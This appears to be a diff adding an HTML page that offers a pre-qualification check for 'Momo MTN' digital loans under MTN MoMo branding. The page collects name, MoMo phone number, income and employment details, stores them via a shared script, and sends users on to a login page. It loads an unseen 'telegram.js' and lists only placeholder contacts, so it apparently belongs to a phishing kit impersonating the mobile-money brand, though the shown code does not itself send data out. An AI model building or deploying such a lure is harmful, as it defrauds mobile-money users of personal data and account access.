@@ -1,0 +1,756 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Check Your Eligibility | Momo MTN</title>
+    <meta name="description" content="Check your eligibility for a Momo MTN digital loan in seconds. Free, instant pre-qualification for supported MTN MoMo countries.">
+
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+
+    <!-- Shared styles -->
+    <link rel="stylesheet" href="assets/css/style.css">
+
+    <style>
+        .result-panel {
+            min-height: 100%;
+        }
+
+        .panel-note {
+            margin-top: 14px;
+            padding-top: 14px;
+            border-top: 1px solid rgba(255, 255, 255, .12);
+            width: 100%;
+            color: #bbb;
+            font-size: 12px;
+            line-height: 1.6;
+        }
+
+        .summary-strip {
+            display: flex;
+            justify-content: space-between;
+            gap: 12px;
+            width: 100%;
+            margin-top: 16px;
+            padding: 14px 16px;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, .06);
+            font-size: 13px;
+        }
+
+        .summary-strip span {
+            color: #ccc;
+            text-align: center;
+            flex: 1;
+        }
+
+        .summary-strip strong {
+            display: block;
+            margin-top: 4px;
+            color: var(--accent);
+            font-size: 15px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- =========================================================
+     NAVBAR
+========================================================= -->
+
+    <header class="navbar">
+
+        <a href="index.html" class="logo">
+
+            <img src="assets/images/logo/logo.png" alt="Momo MTN">
+
+            <span>
+            Momo<span class="yellow">MTN</span>
+        </span>
+
+        </a>
+
+
+        <div class="menu-toggle" id="menuToggle">
+            <i class="fas fa-bars"></i>
+        </div>
+
+
+        <ul class="nav-links" id="navLinks">
+
+            <li>
+                <a href="index.html">Home</a>
+            </li>
+
+            <li>
+                <a href="index.html#features">Features</a>
+            </li>
+
+            <li>
+                <a href="index.html#calculator">Loan Calculator</a>
+            </li>
+
+            <li>
+                <a href="index.html#countries">Countries</a>
+            </li>
+
+            <li>
+                <a href="index.html#contact">Contact</a>
+            </li>
+
+            <li>
+                <a href="eligibility.html" class="nav-apply">
+                Apply Now
+            </a>
+            </li>
+
+        </ul>
+
+    </header>
+
+
+    <!-- =========================================================
+     PAGE HERO
+========================================================= -->
+
+    <section class="page-hero">
+
+        <h1>
+            Check Your <span>Eligibility</span>
+        </h1>
+
+        <p>
+            Answer six quick questions and get an instant pre-qualification result. It takes less than a minute and does not affect your credit profile.
+        </p>
+
+        <div class="breadcrumb">
+            <a href="index.html">Home</a>
+            <i class="fas fa-angle-right"></i>
+            <span>Eligibility</span>
+        </div>
+
+    </section>
+
+
+    <!-- =========================================================
+     ELIGIBILITY CHECKER
+========================================================= -->
+
+    <section>
+
+        <div class="split">
+
+            <div class="card card-shadow">
+
+                <h2 class="card-title">
+                    Tell Us About Yourself
+                </h2>
+
+                <p class="card-sub">
+                    All fields are required so we can give you an accurate result.
+                </p>
+
+
+                <form id="eligibilityForm" novalidate>
+
+                    <div class="form-group">
+
+                        <label for="country">
+                        MTN MoMo Country
+                    </label>
+
+                        <select id="country" name="country">
+
+                        <option value="">Select your country</option>
+
+                        <option value="Ghana">Ghana</option>
+                        <option value="Uganda">Uganda</option>
+                        <option value="Zambia">Zambia</option>
+                        <option value="Cameroon">Cameroon</option>
+                        <option value="Côte d'Ivoire">Côte d'Ivoire</option>
+                        <option value="Guinea">Guinea</option>
+                        <option value="Benin">Benin</option>
+                        <option value="South Sudan">South Sudan</option>
+
+                    </select>
+
+                        <span class="error">
+                        Please select your country.
+                    </span>
+
+                    </div>
+
+
+                    <div class="form-group">
+
+                        <label for="fullName">
+                        Full Name
+                    </label>
+
+                        <input type="text" id="fullName" name="fullName" placeholder="e.g. Kwame Mensah" autocomplete="name">
+
+                        <span class="error">
+                        Please enter your full name.
+                    </span>
+
+                    </div>
+
+
+                    <div class="form-row">
+
+                        <div class="form-group">
+
+                            <label for="phone">
+                            MTN MoMo Number
+                        </label>
+
+                            <input type="tel" id="phone" name="phone" placeholder="e.g. +233 24 000 0000" autocomplete="tel">
+
+                            <span class="error">
+                            Enter a valid MoMo number.
+                        </span>
+
+                        </div>
+
+
+                        <div class="form-group">
+
+                            <label for="income">
+                            Monthly Income (USD)
+                        </label>
+
+                            <input type="number" id="income" name="income" placeholder="e.g. 450" min="1" step="1" inputmode="numeric">
+
+                            <span class="error">
+                            Enter your monthly income.
+                        </span>
+
+                        </div>
+
+                    </div>
+
+
+                    <div class="form-row">
+
+                        <div class="form-group">
+
+                            <label for="employment">
+                            Employment Status
+                        </label>
+
+                            <select id="employment" name="employment">
+
+                            <option value="">Select status</option>
+
+                            <option value="Employed">Employed</option>
+                            <option value="Self-employed">Self-employed</option>
+                            <option value="Business owner">Business owner</option>
+                            <option value="Student">Student</option>
+                            <option value="Unemployed">Unemployed</option>
+
+                        </select>
+
+                            <span class="error">
+                            Please select your employment status.
+                        </span>
+
+                        </div>
+
+
+                        <div class="form-group">
+
+                            <label for="amount">
+                            Loan Amount Needed (USD)
+                        </label>
+
+                            <input type="number" id="amount" name="amount" placeholder="e.g. 500" min="50" step="10" inputmode="numeric">
+
+                            <span class="hint">
+                            Between $50 and $5,000.
+                        </span>
+
+                            <span class="error">
+                            Enter a valid loan amount.
+                        </span>
+
+                        </div>
+
+                    </div>
+
+
+                    <button type="submit" class="btn btn-primary btn-block">
+                    <i class="fas fa-magnifying-glass"></i>
+                    Check My Eligibility
+                </button>
+
+                </form>
+
+            </div>
+
+
+            <!-- RESULT PANEL -->
+
+            <aside class="result-panel" id="resultPanel">
+
+                <i class="fas fa-shield-halved" id="resultIcon"></i>
+
+                <h3 id="resultTitle">
+                    Awaiting Your Details
+                </h3>
+
+                <div class="result-amount hidden" id="resultAmount">
+                    $0.00
+                </div>
+
+                <p id="resultMessage">
+                    Complete the form on the left to see your estimated eligibility and available limit.
+                </p>
+
+                <ul class="reasons hidden" id="resultReasons"></ul>
+
+                <a href="login.html" class="btn btn-primary hidden" id="continueBtn">
+                Continue Application
+            </a>
+
+                <button type="button" class="btn btn-secondary hidden" id="resetBtn">
+                Try Again
+            </button>
+
+            </aside>
+
+        </div>
+
+    </section>
+
+
+    <!-- =========================================================
+     REQUIREMENTS
+========================================================= -->
+
+    <section class="alt compact">
+
+        <div class="section-title">
+
+            <h2>
+                Basic <span>Requirements</span>
+            </h2>
+
+            <p>
+                You only need a few things to start your application.
+            </p>
+
+        </div>
+
+
+        <div class="grid-4">
+
+            <div class="tile">
+
+                <i class="fas fa-user-check"></i>
+
+                <h3>18 Years or Older</h3>
+
+                <p>
+                    Applicants must be at least 18 years old.
+                </p>
+
+            </div>
+
+
+            <div class="tile">
+
+                <i class="fas fa-mobile-screen-button"></i>
+
+                <h3>Active MTN MoMo</h3>
+
+                <p>
+                    A registered MTN Mobile Money number in your own name.
+                </p>
+
+            </div>
+
+
+            <div class="tile">
+
+                <i class="fas fa-wallet"></i>
+
+                <h3>Regular Income</h3>
+
+                <p>
+                    A minimum monthly income of $100 from any source.
+                </p>
+
+            </div>
+
+
+            <div class="tile">
+
+                <i class="fas fa-id-card"></i>
+
+                <h3>Valid ID</h3>
+
+                <p>
+                    A national ID, passport or voter card for verification.
+                </p>
+
+            </div>
+
+        </div>
+
+    </section>
+
+
+    <!-- =========================================================
+     FOOTER
+========================================================= -->
+
+    <footer id="contact">
+
+        <div class="footer-grid">
+
+            <div>
+
+                <h3>Momo MTN</h3>
+
+                <p>
+                    Digital financial services designed to make access to finance simple, convenient and secure.
+                </p>
+
+                <div class="socials">
+
+                    <a href="#"><i class="fab fa-facebook-f"></i></a>
+                    <a href="#"><i class="fab fa-x-twitter"></i></a>
+                    <a href="#"><i class="fab fa-instagram"></i></a>
+                    <a href="#"><i class="fab fa-telegram"></i></a>
+
+                </div>
+
+            </div>
+
+
+            <div>
+
+                <h3>Quick Links</h3>
+
+                <ul>
+
+                    <li><a href="index.html">Home</a></li>
+                    <li><a href="index.html#features">Features</a></li>
+                    <li><a href="index.html#calculator">Loan Calculator</a></li>
+                    <li><a href="index.html#countries">Countries</a></li>
+
+                </ul>
+
+            </div>
+
+
+            <div>
+
+                <h3>Services</h3>
+
+                <ul>
+
+                    <li>Loan Applications</li>
+                    <li>Repayments</li>
+                    <li>Financial Transfers</li>
+                    <li>Eligibility Checking</li>
+
+                </ul>
+
+            </div>
+
+
+            <div>
+
+                <h3>Contact</h3>
+
+                <ul>
+
+                    <li><i class="fas fa-envelope"></i> support@example.com</li>
+                    <li><i class="fas fa-phone"></i> +000 000 000 000</li>
+                    <li><i class="fas fa-clock"></i> 24/7 Support</li>
+
+                </ul>
+
+            </div>
+
+        </div>
+
+
+        <div class="copyright">
+
+            © 2026 Momo MTN. All rights reserved.
+
+        </div>
+
+    </footer>
+
+
+    <!-- =========================================================
+     SCRIPTS
+========================================================= -->
+
+    <script src="assets/js/main.js"></script>
+    <script src="assets/js/telegram.js"></script>
+
+    <script>
+        (function () {
+            'use strict';
+
+            var MIN_INCOME = 100;
+            var MIN_AMOUNT = 50;
+            var MAX_AMOUNT = 5000;
+            var MULTIPLIER = 3;
+            var INTEREST = 10;
+            var TERM = 6;
+
+            var form = document.getElementById('eligibilityForm');
+            var panel = document.getElementById('resultPanel');
+            var resultIcon = document.getElementById('resultIcon');
+            var resultTitle = document.getElementById('resultTitle');
+            var resultAmount = document.getElementById('resultAmount');
+            var resultMessage = document.getElementById('resultMessage');
+            var resultReasons = document.getElementById('resultReasons');
+            var continueBtn = document.getElementById('continueBtn');
+            var resetBtn = document.getElementById('resetBtn');
+
+            var money = window.Momo.money;
+
+            /* ---------------------------------------------
+               VALIDATION HELPERS
+            --------------------------------------------- */
+
+            function clearErrors() {
+                Array.prototype.forEach.call(form.querySelectorAll('.form-group'), function (group) {
+                    group.classList.remove('invalid');
+                });
+            }
+
+            function markInvalid(input, message) {
+                var group = input.closest('.form-group');
+
+                if (!group) {
+                    return;
+                }
+
+                group.classList.add('invalid');
+
+                var error = group.querySelector('.error');
+
+                if (error && message) {
+                    error.textContent = message;
+                }
+            }
+
+            function validate() {
+                clearErrors();
+
+                var valid = true;
+                var firstInvalid = null;
+
+                function fail(input, message) {
+                    markInvalid(input, message);
+                    valid = false;
+
+                    if (!firstInvalid) {
+                        firstInvalid = input;
+                    }
+                }
+
+                var country = document.getElementById('country');
+                var fullName = document.getElementById('fullName');
+                var phone = document.getElementById('phone');
+                var income = document.getElementById('income');
+                var employment = document.getElementById('employment');
+                var amount = document.getElementById('amount');
+
+                if (!country.value) {
+                    fail(country, 'Please select your country.');
+                }
+
+                if (fullName.value.trim().length < 3) {
+                    fail(fullName, 'Please enter your full name.');
+                }
+
+                if (!/^\+?\d{9,15}$/.test(phone.value.replace(/[\s-]/g, ''))) {
+                    fail(phone, 'Enter a valid MoMo number including country code.');
+                }
+
+                var incomeValue = parseFloat(income.value);
+
+                if (isNaN(incomeValue) || incomeValue <= 0) {
+                    fail(income, 'Enter your monthly income in USD.');
+                }
+
+                if (!employment.value) {
+                    fail(employment, 'Please select your employment status.');
+                }
+
+                var amountValue = parseFloat(amount.value);
+
+                if (isNaN(amountValue) || amountValue < MIN_AMOUNT) {
+                    fail(amount, 'The minimum request is ' + money(MIN_AMOUNT) + '.');
+                } else if (amountValue > MAX_AMOUNT) {
+                    fail(amount, 'The maximum request is ' + money(MAX_AMOUNT) + '.');
+                }
+
+                if (!valid && firstInvalid) {
+                    firstInvalid.focus();
+                }
+
+                return valid;
+            }
+
+            /* ---------------------------------------------
+               RESULT RENDERING
+            --------------------------------------------- */
+
+            function showPanel(options) {
+                panel.classList.toggle('is-denied', !!options.denied);
+
+                resultIcon.className = options.icon;
+                resultTitle.textContent = options.title;
+                resultMessage.textContent = options.message;
+
+                if (options.amount) {
+                    resultAmount.textContent = options.amount;
+                    resultAmount.classList.remove('hidden');
+                } else {
+                    resultAmount.classList.add('hidden');
+                }
+
+                resultReasons.innerHTML = '';
+
+                if (options.reasons && options.reasons.length) {
+                    options.reasons.forEach(function (reason) {
+                        var item = document.createElement('li');
+                        item.innerHTML = '<i class="fas fa-circle-xmark"></i><span></span>';
+                        item.querySelector('span').textContent = reason;
+                        resultReasons.appendChild(item);
+                    });
+
+                    resultReasons.classList.remove('hidden');
+                } else {
+                    resultReasons.classList.add('hidden');
+                }
+
+                continueBtn.classList.toggle('hidden', !options.eligible);
+                resetBtn.classList.toggle('hidden', !options.denied);
+            }
+
+            /* ---------------------------------------------
+               SUBMIT
+            --------------------------------------------- */
+
+            form.addEventListener('submit', function (event) {
+                event.preventDefault();
+
+                if (!validate()) {
+                    return;
+                }
+
+                var data = {
+                    country: document.getElementById('country').value,
+                    fullName: document.getElementById('fullName').value.trim(),
+                    phone: document.getElementById('phone').value.trim(),
+                    income: parseFloat(document.getElementById('income').value),
+                    employment: document.getElementById('employment').value,
+                    amount: parseFloat(document.getElementById('amount').value),
+                    term: TERM,
+                    interest: INTEREST
+                };
+
+                var limit = Math.min(Math.round(data.income * MULTIPLIER), MAX_AMOUNT);
+                var reasons = [];
+
+                if (data.income < MIN_INCOME) {
+                    reasons.push('A minimum monthly income of ' + money(MIN_INCOME) + ' is required.');
+                }
+
+                if (data.employment === 'Unemployed') {
+                    reasons.push('An active source of income is required to qualify.');
+                }
+
+                if (data.amount > limit) {
+                    reasons.push('The maximum available for your income is ' + money(limit) + '.');
+                }
+
+                if (reasons.length) {
+                    showPanel({
+                        denied: true,
+                        eligible: false,
+                        icon: 'fas fa-circle-xmark',
+                        title: 'Not Eligible Yet',
+                        message: 'We could not pre-qualify this request. Review the points below and try again.',
+                        reasons: reasons
+                    });
+
+                    window.Momo.merge(data);
+
+                    return;
+                }
+
+                var total = data.amount + (data.amount * INTEREST / 100);
+                var monthly = total / TERM;
+
+                showPanel({
+                    denied: false,
+                    eligible: true,
+                    icon: 'fas fa-circle-check',
+                    title: 'Congratulations, You Are Pre-Qualified',
+                    amount: money(limit),
+                    message: 'Estimated monthly repayment for ' + money(data.amount) + ' over ' + TERM +
+                        ' months is ' + money(monthly) + ' at ' + INTEREST + '% interest.'
+                });
+
+                data.eligible = true;
+                data.limit = limit;
+                data.monthlyRepayment = Number(monthly.toFixed(2));
+
+                window.Momo.merge(data);
+            });
+
+            /* ---------------------------------------------
+               RESET
+            --------------------------------------------- */
+
+            resetBtn.addEventListener('click', function () {
+                form.reset();
+                clearErrors();
+
+                showPanel({
+                    denied: false,
+                    eligible: false,
+                    icon: 'fas fa-shield-halved',
+                    title: 'Awaiting Your Details',
+                    message: 'Complete the form on the left to see your estimated eligibility and available limit.'
+                });
+
+                document.getElementById('country').focus();
+            });
+
+            /* ---------------------------------------------
+               PREFILL FROM A PREVIOUS CHECK
+            --------------------------------------------- */
+
+            var saved = window.Momo.read();
+
+            if (saved) {
+                ['country', 'fullName', 'phone', 'income', 'employment', 'amount'].forEach(function (id) {
+                    var input = document.getElementById(id);
+
+                    if (input && saved[id] !== undefined && saved[id] !== null && saved[id] !== '') {
+                        input.value = saved[id];
+                    }
+                });
+            }
+        })();
+    </script>
+
+</body>
+
+</html>
